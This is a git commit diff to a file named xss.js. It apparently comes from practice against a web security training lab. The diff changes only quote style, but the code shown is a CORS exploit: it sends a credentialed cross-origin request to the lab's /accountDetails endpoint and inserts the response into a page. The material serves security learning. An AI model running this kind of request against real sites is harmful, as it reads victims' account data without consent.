d435a599f9b2685525aa5aa6a8c91d2ea7449a10
jvstmer <57935669+jvstmer@users.noreply.github.com>
2022-06-22 00:57:17 -0500

    Update xss.js

--- folder/xss.js
+++ folder/xss.js
@@ -12,9 +12,9 @@ function reqListener() {
 function cors() {
   var req = new XMLHttpRequest();
   req.onload = function() {
-      document.getElementById('report').innerHTML = this.responseText;
+      document.getElementById("report").innerHTML = this.responseText;
   }
-  req.open('get','https://0ab0002a04799b80c01d1367008700dc.web-security-academy.net/accountDetails',true);
+  req.open("GET","https://0ab0002a04799b80c01d1367008700dc.web-security-academy.net/accountDetails",true);
   req.withCredentials = true;
   req.send();
 
